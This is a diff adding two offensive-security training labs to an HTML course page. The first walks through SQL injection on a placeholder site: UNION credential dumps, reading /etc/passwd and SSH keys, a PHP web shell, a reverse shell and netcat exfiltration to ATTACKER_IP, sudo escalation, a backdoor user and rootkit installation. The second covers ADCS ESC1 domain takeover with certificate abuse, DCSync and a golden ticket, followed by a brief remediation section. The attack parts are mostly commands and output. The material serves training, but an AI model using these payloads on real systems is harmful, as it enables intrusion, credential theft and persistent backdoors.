+            <p><strong>Scenario:</strong> You've discovered SQL injection in a web application. Your mission: exploit it to dump the database, escalate to file read/write, achieve RCE, and take over the underlying server. This lab teaches advanced SQLi techniques—union-based, blind, out-of-band, file operations, and post-exploitation!</p>
+
+            <h4>Step 1: Initial SQLi Discovery & Enumeration</h4>
+
+            <div class="code"># Target: http://vulnerable-site.com/product.php?id=1
+
+# Test for SQLi:
+http://vulnerable-site.com/product.php?id=1'
+
+# Error message:
+# "You have an error in your SQL syntax near ''' at line 1"
+
+# Confirmed SQL injection!
+
+# Determine number of columns (UNION-based):
+http://vulnerable-site.com/product.php?id=1 ORDER BY 1-- -     # Works
+http://vulnerable-site.com/product.php?id=1 ORDER BY 2-- -     # Works
+http://vulnerable-site.com/product.php?id=1 ORDER BY 3-- -     # Works
+http://vulnerable-site.com/product.php?id=1 ORDER BY 4-- -     # Error!
+
+# 3 columns in SELECT statement
+
+# Find injectable columns:
+http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,2,3-- -
+
+# Page shows numbers in output (let's say 2 and 3 are visible)
+
+# Database enumeration:
+http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,@@version,database()-- -
+
+# Output:
+# MySQL Version: 8.0.32-0ubuntu0.20.04.2
+# Current Database: webapp_db
+
+# List databases:
+http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -
+
+# Output:
+# information_schema
+# mysql
+# performance_schema
+# webapp_db
+
+# List tables in webapp_db:
+http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='webapp_db'-- -
+
+# Output:
+# products
+# users       # Interesting!
+# orders
+# admin_users # Very interesting!
+
+# List columns in users table:
+http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
+
+# Output:
+# id
+# username
+# email
+# password  # Jackpot!
+# role
+
+# Dump users table:
+http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,CONCAT(username,':',password),email FROM users-- -
+
+# Output:
+# admin:$2y$10$abcdef1234567890...
+# john:$2y$10$xyz9876543210...
+# jane:$2y$10$qwerty...
+
+# Bcrypt hashes - need to crack offline</div>
+
+            <h4>Step 2: File Operations (Reading /etc/passwd)</h4>
+
+            <div class="code"># Check if file read is possible:
+http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
+
+# Output:
+# root:x:0:0:root:/root:/bin/bash
+# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+# mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false
+# webadmin:x:1000:1000:Web Admin:/home/webadmin:/bin/bash
+
+# Users discovered:
+# • root (UID 0)
+# • www-data (UID 33, web server)
+# • webadmin (UID 1000, real user)
+
+# Read web application source:
+http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3-- -
+
+# Output (config.php):
+# <?php
+# $db_host = "localhost";
+# $db_user = "webapp_user";
+# $db_pass = "SuperSecretPassword123!";
+# $db_name = "webapp_db";
+# ?>
+
+# Credentials found!
+
+# Read MySQL config:
+http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,LOAD_FILE('/etc/mysql/my.cnf'),3-- -
+
+# Check for SSH keys:
+http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,LOAD_FILE('/home/webadmin/.ssh/id_rsa'),3-- -
+
+# If SSH key found → instant SSH access!
+
+# Read Apache logs (password spraying evidence):
+http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,LOAD_FILE('/var/log/apache2/access.log'),3-- -</div>
+
+            <h4>Step 3: File Write (Web Shell Upload)</h4>
+
+            <div class="code"># Check if file write possible:
+# Requires: FILE privilege + writable directory
+
+# Test write to /var/www/html/:
+http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,'<?php echo "TEST"; ?>',3 INTO OUTFILE '/var/www/html/test.php'-- -
+
+# Access: http://vulnerable-site.com/test.php
+# If "TEST" appears → file write works!
+
+# Upload web shell:
+http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
+
+# Execute commands:
+http://vulnerable-site.com/shell.php?cmd=id
+# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+http://vulnerable-site.com/shell.php?cmd=whoami
+# Output: www-data
+
+http://vulnerable-site.com/shell.php?cmd=uname -a
+# Output: Linux webapp-server 5.4.0-150-generic #167-Ubuntu...
+
+# RCE achieved!</div>
+
+            <h4>Step 4: Reverse Shell & Privilege Escalation</h4>
+
+            <div class="code"># Upgrade to interactive reverse shell:
+
+# Start listener on attacker:
+nc -lvnp 4444
+
+# Execute reverse shell via web shell:
+http://vulnerable-site.com/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+
+# URL-encoded:
+http://vulnerable-site.com/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27
+
+# Connection received!
+# www-data@webapp-server:/var/www/html$
+
+# Stabilize shell:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+
+# Enumerate system:
+ls -la /home
+# /home/webadmin
+
+cat /etc/cron*
+# Look for cron jobs running as root
+
+find / -perm -4000 2>/dev/null
+# SUID binaries
+
+# Check sudo:
+sudo -l
+# (www-data) NOPASSWD: /usr/bin/perl
+
+# Escalate via sudo perl:
+sudo perl -e 'exec "/bin/bash";'
+
+# root@webapp-server:/#
+id
+# uid=0(root) gid=0(root) groups=0(root)
+
+# Root achieved!</div>
+
+            <h4>Step 5: Post-Exploitation & Persistence</h4>
+
+            <div class="code"># Dump all MySQL databases:
+mysqldump -u root -p --all-databases > /tmp/all_databases.sql
+
+# Copy to attacker:
+nc ATTACKER_IP 5555 < /tmp/all_databases.sql
+
+# On attacker:
+nc -lvnp 5555 > databases.sql
+
+# Add SSH key for persistence:
+mkdir -p /root/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+
+# SSH as root:
+ssh root@vulnerable-site.com
+
+# Create backdoor user:
+useradd -m -s /bin/bash -G sudo backdoor
+echo 'backdoor:SecurePassword123' | chpasswd
+
+# Add to sudoers (no password):
+echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+
+# Rootkit installation (advanced):
+git clone https://github.com/f0rb1dd3n/Reptile.git
+cd Reptile
+make
+
+# Load kernel module:
+insmod reptile.ko
+
+# Reptile features:
+# • Hidden processes
+# • Hidden files
+# • Hidden network connections
+# • Rootshell backdoor
+
+# Complete compromise!</div>
+
+            <div class="metaphor-box">
+                <h4>💡 Lab 9 Key Takeaways</h4>
+                <p><strong>SQL Injection attack chain:</strong><br>
+                1. <strong>Discovery:</strong> Find SQLi via error messages or blind techniques<br>
+                2. <strong>Enumeration:</strong> information_schema → databases → tables → columns<br>
+                3. <strong>Data extraction:</strong> UNION SELECT to dump credentials<br>
+                4. <strong>File read:</strong> LOAD_FILE() to access sensitive files<br>
+                5. <strong>File write:</strong> INTO OUTFILE to upload web shell<br>
+                6. <strong>RCE:</strong> Execute commands via web shell<br>
+                7. <strong>Privilege escalation:</strong> SUID, sudo, kernel exploits<br>
+                8. <strong>Persistence:</strong> SSH keys, backdoor users, rootkits<br><br>
+                <strong>Advanced SQLi techniques:</strong><br>
+                • <strong>Blind SQLi:</strong> Boolean-based (true/false responses), time-based (SLEEP())<br>
+                • <strong>Out-of-band:</strong> DNS exfiltration, HTTP callbacks<br>
+                • <strong>Second-order:</strong> Payload stored, executed later<br>
+                • <strong>NoSQL injection:</strong> MongoDB, CouchDB (different syntax)<br><br>
+                <strong>Tools:</strong><br>
+                • <strong>SQLmap:</strong> Automated SQLi exploitation<br>
+                • <strong>Burp Suite:</strong> Manual testing with Intruder<br>
+                • <strong>Havij:</strong> GUI SQLi tool (Windows)<br><br>
+                SQL injection remains #1 web vulnerability in 2026. Master this = guaranteed findings! 💉🗄️</p>
+            </div>
+
+            <h3>Lab 10: Complete Domain Takeover via Certificate Services (ADCS ESC1)</h3>
+
+            <p><strong>Scenario:</strong> You've gained low-privilege domain access. During enumeration, you discover Active Directory Certificate Services (ADCS) is misconfigured. Your mission: exploit ESC1 vulnerability to request a certificate as Domain Admin, authenticate as DA, and take over the domain. This lab teaches ADCS fundamentals, Certify enumeration, ESC1 exploitation, and certificate-based authentication!</p>
+
+            <h4>Step 1: Initial Domain Access & ADCS Discovery</h4>
+
+            <div class="code"># You have low-privilege domain credentials:
+# Username: corp\\lowpriv
+# Password: Welcome123
+
+# From Windows attack machine:
+# Or from Linux with evil-winrm, impacket, etc.
+
+# Enumerate ADCS:
+# Tool: Certify.exe (https://github.com/GhostPack/Certify)
+
+# Download Certify:
+# https://github.com/GhostPack/Certify/releases
+
+# Run Certify (enumerate vulnerable templates):
+.\\Certify.exe find /vulnerable
+
+# Output:
+# [*] Action: Find certificate templates
+# [*] Using current user's unrolled group SIDs for vulnerability checks.
+# [*] Using the search base 'CN=Configuration,DC=corp,DC=com'
+# 
+# [*] Listing info about the Enterprise CA 'corp-DC-CA'
+# 
+#     Enterprise CA Name            : corp-DC-CA
+#     DNS Hostname                  : DC.corp.com
+#     FullName                      : DC.corp.com\\corp-DC-CA
+#     Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+#     Cert SubjectName              : CN=corp-DC-CA, DC=corp, DC=com
+#     Cert Thumbprint               : 1234567890ABCDEF...
+#     Cert Serial                   : 123456789
+#     Cert Start Date               : 1/1/2024 12:00:00 AM
+#     Cert End Date                 : 1/1/2029 12:00:00 AM
+# 
+# [!] Vulnerable Certificates Templates :
+# 
+#     CA Name                       : DC.corp.com\\corp-DC-CA
+#     Template Name                 : UserTemplate
+#     Schema Version                : 2
+#     Validity Period               : 1 year
+#     Renewal Period                : 6 weeks
+#     msPKI-Certificates-Name-Flag  : ENROLLEE_SUPPLIES_SUBJECT
+#     mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+#     Authorized Signatures Required: 0
+#     pkiextendedkeyusage           : Client Authentication
+#     Permissions
+#       Enrollment Permissions
+#         Enrollment Rights           : CORP\\Domain Users
+# 
+# [!] ESC1 VULNERABILITY DETECTED!
+# 
+# Template allows:
+# • Domain Users can enroll
+# • ENROLLEE_SUPPLIES_SUBJECT (requester controls Subject Alternative Name)
+# • Client Authentication EKU (can authenticate as any user)
+# 
+# This allows ANY domain user to request certificate as ANY user (including Domain Admin!)
+
+# ESC1 = Enrollee Supplies Subject + Client Auth EKU</div>
+
+            <h4>Step 2: Request Certificate as Domain Admin</h4>
+
+            <div class="code"># Use Certify to request certificate:
+
+# Request cert as "Administrator" (Domain Admin):
+.\\Certify.exe request /ca:DC.corp.com\\corp-DC-CA /template:UserTemplate /altname:Administrator
+
+# Output:
+# [*] Action: Request a Certificates
+# [*] Current user context    : CORP\\lowpriv
+# [*] No subject name specified, using current context as subject.
+# 
+# [*] Template                : UserTemplate
+# [*] Subject                 : CN=lowpriv, CN=Users, DC=corp, DC=com
+# [*] AltName                 : Administrator
+# 
+# [*] Certificate Authority   : DC.corp.com\\corp-DC-CA
+# 
+# [*] CA Response             : The certificate had been issued.
+# [*] Request ID              : 123
+# 
+# [*] cert.pem :
+# -----BEGIN RSA PRIVATE KEY-----
+# MIIEpAIBAAKCAQEA4Z...
+# -----END RSA PRIVATE KEY-----
+# -----BEGIN CERTIFICATE-----
+# MIIGHjCCBQagAwIBAgITEgAAAA...
+# -----END CERTIFICATE-----
+# 
+# [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+# Save output to cert.pem
+
+# Convert to PFX:
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx
+
+# Enter password: password123
+
+# We now have admin.pfx certificate for "Administrator" user!</div>
+
+            <h4>Step 3: Authenticate as Domain Admin (Rubeus)</h4>
+
+            <div class="code"># Use Rubeus to request TGT with certificate:
+# Tool: Rubeus.exe (https://github.com/GhostPack/Rubeus)
+
+# Request TGT using certificate:
+.\\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password123 /nowrap
+
+# Output:
+# [*] Action: Ask TGT
+# 
+# [*] Using PKINIT with etype rc4_hmac and subject: CN=lowpriv, CN=Users, DC=corp, DC=com
+# [*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.com\\Administrator'
+# [+] TGT request successful!
+# [*] base64(ticket.kirbi):
+# 
+#       doIFujCCBbagAwIBBaEDAgEWooIEvjCCBLphggS2MIIEsqADAgEFoQwbCkNPUlAuQ09NoiUw
+#       I6ADAgECoRwwGhsGa3JidGd0GxBDT1JQLkNPTaOCBGQwggRgoAMCARKhAwIBAqKCBFIEggRO
+#       ... (very long base64 blob) ...
+# 
+# [+] Ticket successfully imported!
+
+# Copy the base64 TGT
+
+# Import into current session:
+.\\Rubeus.exe ptt /ticket:[BASE64_TGT]
+
+# Output:
+# [*] Action: Import Ticket
+# [+] Ticket successfully imported!
+
+# Verify:
+klist
+
+# Output:
+# Current LogonId is 0:0x3e7
+# 
+# Cached Tickets: (1)
+# 
+# #0>     Client: Administrator @ CORP.COM
+#         Server: krbtgt/CORP.COM @ CORP.COM
+#         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+#         Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+#         Start Time: 1/9/2026 10:00:00 (local)
+#         End Time:   1/9/2026 20:00:00 (local)
+#         Renew Time: 1/16/2026 10:00:00 (local)
+#         Session Key Type: AES-256-CTS-HMAC-SHA1-96
+#         Cache Flags: 0x1 -> PRIMARY
+
+# We are now "Administrator"!</div>
+
+            <h4>Step 4: Domain Takeover</h4>
+
+            <div class="code"># With Domain Admin TGT, we can do ANYTHING:
+
+# List domain admins:
+net group "Domain Admins" /domain
+
+# Output:
+# Administrator
+# DA_User1
+# DA_User2
+
+# Access Domain Controller:
+dir \\\\DC.corp.com\\C$
+
+# Output:
+# Volume in drive \\\\DC.corp.com\\C$ is Windows
+# Directory of \\\\DC.corp.com\\C$
+# 
+# 01/01/2024  12:00 AM    <DIR>          Program Files
+# 01/01/2024  12:00 AM    <DIR>          Users
+# 01/01/2024  12:00 AM    <DIR>          Windows
+# ...
+
+# Access works!
+
+# DCSync (dump all domain hashes):
+# Tool: Mimikatz or Impacket secretsdump
+
+# From Linux:
+impacket-secretsdump -k -no-pass corp.com/Administrator@DC.corp.com
+
+# Output:
+# [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
+# [*] Using the DRSUAPI method to get NTDS.DIT secrets
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3a5c3b2e1f4g5h6i7j8k9l0m1n2o3p4:::
+# DA_User1:1104:aad3b435b51404eeaad3b435b51404ee:58a52d27c84a2f6c78b9c3d4e5f6a7b8:::
+# ...
+
+# All domain hashes dumped!
+
+# Create Golden Ticket (persistent domain admin):
+# From Windows with Mimikatz:
+mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.com /sid:S-1-5-21-123456789-987654321-111111111 /krbtgt:d3a5c3b2e1f4g5h6i7j8k9l0m1n2o3p4 /id:500 /ptt
+
+# Golden Ticket injected!
+# Valid for 10 years
+# Survives password changes
+# Backdoor access to domain forever!</div>
+
+            <h4>Step 5: Defense & Remediation</h4>
+
+            <div class="code"># How companies defend against ADCS attacks:
+
+# 1. Fix vulnerable templates:
+# • Remove "ENROLLEE_SUPPLIES_SUBJECT" flag
+# • Require manager approval
+# • Require authorized signatures
+# • Restrict enrollment rights
+
+# Remediation for UserTemplate:
+# - Open Certificate Templates Console
+# - Edit "UserTemplate"
+# - Subject Name tab → Uncheck "Supply in the request"
+# - Security tab → Remove "Domain Users" enrollment rights
+
+# 2. Enable certificate auditing:
+# • Event ID 4886 (certificate requested)
+# • Event ID 4887 (certificate issued)
+# • Monitor for unusual SAN values
+
+# 3. Patch other ESC vulnerabilities:
+# • ESC2: Any Purpose EKU
+# • ESC3: Enrollment Agent templates
+# • ESC4: Vulnerable template ACLs
+# • ESC5: Vulnerable CA ACLs
+# • ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag
+# • ESC7: Vulnerable CA permissions
+# • ESC8: NTLM relay to ADCS HTTP endpoints
+
+# 4. Detection:
+# • Certutil to enumerate templates:
+certutil -v -template > templates.txt
+
+# • PowerShell:
+Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=com" -Filter * -Properties *
+
+# • Tools:
+#   - Certify.exe find /vulnerable
+#   - PSPKIAudit.ps1
+#   - ADCSTemplate PowerShell module
+
+# 5. Monitoring:
+# • Alert on Event ID 4886 + unusual Subject Alternative Names
+# • Monitor for Certify.exe, Rubeus.exe execution
+# • Detect PKINIT authentication (Event ID 4768 with certificate)</div>
+
+            <div class="metaphor-box">
+                <h4>💡 Lab 10 Key Takeaways</h4>
+                <p><strong>ADCS ESC1 attack chain:</strong><br>
+                1. <strong>Enumerate:</strong> Use Certify.exe to find vulnerable templates<br>
+                2. <strong>ESC1 criteria:</strong> ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU + Domain Users enrollment<br>
+                3. <strong>Request cert:</strong> Specify SAN as Domain Admin (Certify.exe request)<br>
+                4. <strong>Convert cert:</strong> PEM → PFX with openssl<br>
+                5. <strong>Authenticate:</strong> Use Rubeus.exe asktgt with certificate (PKINIT)<br>
+                6. <strong>Import TGT:</strong> Rubeus.exe ptt to inject ticket<br>
+                7. <strong>DCSync:</strong> Dump all domain hashes with Domain Admin access<br>
+                8. <strong>Golden Ticket:</strong> Create persistent backdoor with krbtgt hash<br><br>
+                <strong>Why ADCS attacks are powerful:</strong><br>
+                • Certificates = alternate authentication method<br>
+                • Less monitored than password attacks<br>
+                • Bypass MFA (certificate satisfies "something you have")<br>
+                • Misconfigured templates = instant DA<br>
+                • Hard to detect without proper auditing<br><br>
+                <strong>Other ADCS vulnerabilities (ESC2-ESC8):</strong><br>
+                • <strong>ESC2:</strong> Any Purpose EKU allows impersonation<br>
+                • <strong>ESC3:</strong> Enrollment Agent can request certs for others<br>
+                • <strong>ESC4:</strong> Vulnerable ACLs allow template modification<br>
+                • <strong>ESC6:</strong> EDITF flag allows arbitrary SANs<br>
+                • <strong>ESC8:</strong> NTLM relay to ADCS web enrollment<br><br>
+                <strong>Resources:</strong><br>
+                • <strong>SpecterOps blog:</strong> "Certified Pre-Owned" whitepaper<br>
+                • <strong>Tool:</strong> Certify.exe (enumerate + exploit)<br>
+                • <strong>Tool:</strong> Certipy (Python alternative for Linux)<br>
+                • <strong>Defense:</strong> Microsoft ADCS security baseline<br><br>
+                ADCS is THE most overlooked AD attack path in 2026. Check EVERY engagement! 🎫🔐</p>
+            </div>
+
             <div class="metaphor-box">
                 <h4>🎉 You're a Practical Attack Master!</h4>
                 <p>You've completed 5 comprehensive labs covering:<br><br>
